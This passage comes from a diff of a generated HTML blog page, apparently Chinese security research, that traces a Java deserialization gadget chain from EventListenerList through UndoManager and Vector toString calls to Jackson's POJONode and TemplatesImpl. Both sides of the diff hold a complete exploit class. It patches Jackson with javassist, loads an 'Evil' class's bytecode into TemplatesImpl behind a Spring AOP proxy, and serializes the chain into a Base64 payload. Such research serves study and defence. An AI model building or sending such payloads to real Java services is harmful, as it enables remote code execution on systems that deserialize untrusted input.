l;<br><br>            listenerList = tmp;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!t.isInstance(l)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Listener &quot;</span> + l +</span><br><span class="line">                                         <span class="string">&quot; is not of type &quot;</span> + t);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!t.isInstance(l)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Listener &quot;</span> + l +<br>                                         <span class="hljs-string">&quot; is not of type &quot;</span> + t);<br>        &#125;<br></code></pre></td></tr></table></figure>
 
 <p>然后会调用<code>add</code>方法，这里跟到add方法中看看。这里使用的是拼接方法，就是这里会有一个隐式转换调用<code>toString</code></p>
-<h4 id="javax-swing-undo-UndoManager-toString"><a href="#javax-swing-undo-UndoManager-toString" class="headerlink" title="javax.swing.undo.UndoManager#toString"></a>javax.swing.undo.UndoManager#toString</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.toString() + <span class="string">&quot; limit: &quot;</span> + limit +</span><br><span class="line">            <span class="string">&quot; indexOfNextAdd: &quot;</span> + indexOfNextAdd;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h4 id="javax-swing-undo-UndoManager-toString"><a href="#javax-swing-undo-UndoManager-toString" class="headerlink" title="javax.swing.undo.UndoManager#toString"></a>javax.swing.undo.UndoManager#toString</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.toString() + <span class="hljs-string">&quot; limit: &quot;</span> + limit +<br>            <span class="hljs-string">&quot; indexOfNextAdd: &quot;</span> + indexOfNextAdd;<br>    &#125;<br></code></pre></td></tr></table></figure>
 
 <p>这里两个值都是<code>int</code>，我们直接看<code>super.toString</code>，他父类的方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.toString()</span><br><span class="line">            + <span class="string">&quot; inProgress: &quot;</span> + inProgress</span><br><span class="line">            + <span class="string">&quot; edits: &quot;</span> + edits;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.toString()<br>            + <span class="hljs-string">&quot; inProgress: &quot;</span> + inProgress<br>            + <span class="hljs-string">&quot; edits: &quot;</span> + edits;<br>    &#125;<br></code></pre></td></tr></table></figure>
 
 <h4 id="java-util-Vector-toString"><a href="#java-util-Vector-toString" class="headerlink" title="java.util.Vector#toString"></a>java.util.Vector#toString</h4><p>这里存在两个值，我们看到<code>edits</code>是<code>Vector</code>类，这里同样会隐式转换调用<code>Vector</code>类的<code>toString</code>方法，我们跟进看看</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Vector&lt;UndoableEdit&gt; edits;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Vector&lt;UndoableEdit&gt; edits;<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.toString();<br>    &#125;<br></code></pre></td></tr></table></figure>
 
 <p>继续调用了父类的<code>toString</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        Iterator&lt;E&gt; it = iterator();</span><br><span class="line">        <span class="keyword">if</span> (! it.hasNext())</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[]&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> it.next();</span><br><span class="line">            sb.append(e == <span class="built_in">this</span> ? <span class="string">&quot;(this Collection)&quot;</span> : e);</span><br><span class="line">            <span class="keyword">if</span> (! it.hasNext())</span><br><span class="line">                <span class="keyword">return</span> sb.append(<span class="string">&#x27;]&#x27;</span>).toString();</span><br><span class="line">            sb.append(<span class="string">&#x27;,&#x27;</span>).append(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        Iterator&lt;E&gt; it = iterator();<br>        <span class="hljs-keyword">if</span> (! it.hasNext())<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[]&quot;</span>;<br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        sb.append(<span class="hljs-string">&#x27;[&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (;;) &#123;<br>            <span class="hljs-type">E</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> it.next();<br>            sb.append(e == <span class="hljs-built_in">this</span> ? <span class="hljs-string">&quot;(this Collection)&quot;</span> : e);<br>            <span class="hljs-keyword">if</span> (! it.hasNext())<br>                <span class="hljs-keyword">return</span> sb.append(<span class="hljs-string">&#x27;]&#x27;</span>).toString();<br>            sb.append(<span class="hljs-string">&#x27;,&#x27;</span>).append(<span class="hljs-string">&#x27; &#x27;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
 
 <p>然后使用了<code>StringBuilder</code>的<code>append</code>方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> StringBuilder <span class="title function_">append</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> append(String.valueOf(obj));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> StringBuilder <span class="hljs-title function_">append</span><span class="hljs-params">(Object obj)</span> &#123;<br>        <span class="hljs-keyword">return</span> append(String.valueOf(obj));<br>    &#125;<br></code></pre></td></tr></table></figure>
 
 <p>继续跟进<code>valueOf</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">valueOf</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (obj == <span class="literal">null</span>) ? <span class="string">&quot;null&quot;</span> : obj.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">valueOf</span><span class="hljs-params">(Object obj)</span> &#123;<br>    <span class="hljs-keyword">return</span> (obj == <span class="hljs-literal">null</span>) ? <span class="hljs-string">&quot;null&quot;</span> : obj.toString();<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>到这里，就完成了任意<code>toString</code>方法调用了。</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_EventListenerList</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// javassist 修改 BaseJsonNode</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">            writeReplace.setBody(<span class="string">&quot;return $0;&quot;</span>);</span><br><span class="line">            ctClass.writeFile();</span><br><span class="line">            ctClass.toClass();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes,ClassFiles.classAsBytes(jackson_BadAttributeValueExpException.Foo.class)&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用 Spring AOP 中的 JdkDynamicAopProxy,确保只触发 getOutputProperties</span></span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templatesImpl);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">undoManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(undoManager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(pojoNode);</span><br><span class="line">        setFieldValue(eventListenerList, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(eventListenerList);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray())));</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray())).length());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jackson_EventListenerList</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// javassist 修改 BaseJsonNode</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.getCtClass(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            writeReplace.setBody(<span class="hljs-string">&quot;return $0;&quot;</span>);<br>            ctClass.writeFile();<br>            ctClass.toClass();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes,ClassFiles.classAsBytes(jackson_BadAttributeValueExpException.Foo.class)&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_transletIndex&quot;</span>, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">//使用 Spring AOP 中的 JdkDynamicAopProxy,确保只触发 getOutputProperties</span><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templatesImpl);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxy);<br><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(pojoNode);<br>        setFieldValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(eventListenerList);<br>        oos.close();<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray())));<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray())).length());<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>            <span class="hljs-keyword">if</span> ( field != <span class="hljs-literal">null</span> )<br>                field.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( clazz.getSuperclass() != <span class="hljs-literal">null</span> )<br>                field = getField(clazz.getSuperclass(), fieldName);<br><br>            <span class="hljs-keyword">return</span> field;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( NoSuchFieldException e ) &#123;<br>            <span class="hljs-keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;<br>                <span 